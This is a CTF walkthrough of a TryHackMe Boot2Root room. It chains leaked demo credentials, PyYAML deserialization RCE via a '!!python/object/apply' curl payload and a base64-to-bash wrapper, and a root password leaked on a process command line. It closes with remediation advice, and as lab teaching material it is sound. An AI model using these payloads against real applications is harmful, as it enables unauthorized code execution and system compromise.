# Hacker Holidays: Day 5 - Beach Bar

**Category:** Boot2Root
**Difficulty:** Easy

## 🛎️ Concierge Briefing
> The Beach Bar's jukebox accepts more than song titles. Playlists are parsed as YAML — and the parser is feeling generous. Meanwhile, something root-owned is shouting its password to anyone who runs `ps`.

---

## 🕵️‍♂️ Recon

```bash
nmap -sV -sC -T4 MACHINE_IP
```

```text
22/tcp open  ssh
80/tcp open  http    gunicorn
```

A Flask/Gunicorn app on port 80, with the root page redirecting to `/login`. `gobuster` surfaces the app structure:

```text
/dashboard   /export   /import   /login   /logout
```

## 🎟️ Demo Credentials

The `/login` page source hides a staff note:

```html
<!--
  staff note: the demo DJ login is still enabled for the soft opening.
  dj / dj  -- swap this before the season starts (ticket BAR-7)
-->
```

`dj:dj` it is:

```bash
curl -s -i -c c.txt -b c.txt -X POST http://MACHINE_IP/login -d 'username=dj&password=dj'
```

## 🎛️ The Playlist Import

`/export` hands back a sample YAML playlist. `/import` takes one and reflects the parsed structure in the response — a strong sign of server-side YAML deserialization. After getting RCE, the source confirms the sink:

```python
parsed = yaml.load(content, Loader=yaml.Loader)
```

`yaml.load` with the default `Loader` on user input is game over in one line.

## 💥 RCE via PyYAML

PyYAML's `yaml.Loader` honors Python tags, so I used `!!python/object/apply` to run code during parsing:

```bash
curl -s -b c.txt -X POST http://MACHINE_IP/import \
  --data-urlencode 'playlist=!!python/object/apply:subprocess.check_output [["id"]]'
```

The response confirms execution as `bartender`:

```text
uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)
```

For longer commands, base64 avoids quoting issues:

```yaml
!!python/object/apply:subprocess.check_output [["bash","-c","echo <b64> | base64 -d | bash"]]
```

## 🚩 User Flag

```bash
cat /home/bartender/user.txt
```

**Flag:** `THM{REDACTED}`

## 👑 Privilege Escalation

Process enumeration shows a root-owned jukebox daemon with an interesting command line:

```bash
ps auxf
```

```text
root ... /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass <REDACTED> --bitrate 320k
```

The `--stream-pass` secret was passed as a process argument — visible to any local user through `ps` or `/proc`. And that same value turns out to be the `root` password:

```bash
su - root
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

## 🚩 Root Flag

```bash
cat /root/root.txt
```

**Flag:** `THM{REDACTED}`

## 💡 Why This Works

Two classic flaws chained together:

1. **Unsafe deserialization** — `yaml.load(..., Loader=yaml.Loader)` constructs Python objects from attacker input, giving RCE as the application user.
2. **Credential disclosure + reuse** — a secret on the command line of a root-owned process, reused as the root password. A single `ps auxf` becomes full system compromise.

## 🛡️ Fixes

- Use `yaml.safe_load()` (or schema validation), never `yaml.load` on user input
- Remove demo accounts like `dj:dj` from production
- Never pass secrets as process arguments — use env files with restricted permissions
- Don't reuse the same password across user/root contexts
- Run services as least privilege, not root

## 📝 Final Thoughts

A clean Boot2Root sandwich: demo credentials → unsafe YAML → RCE as `bartender` → leaked argv password → root. Both flags in about twenty minutes.

**Documented and tested for TryHackMe — Hacker Holidays 2026**
